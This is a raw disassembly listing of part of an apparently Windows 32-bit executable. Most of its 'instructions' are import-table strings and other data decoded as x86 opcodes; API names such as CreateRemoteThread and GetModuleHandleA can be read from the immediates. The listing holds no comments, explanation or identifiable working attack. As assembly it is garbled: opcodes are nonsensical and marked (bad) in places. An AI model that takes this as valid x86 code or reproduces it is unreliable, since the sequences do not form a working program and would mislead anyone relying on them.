  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
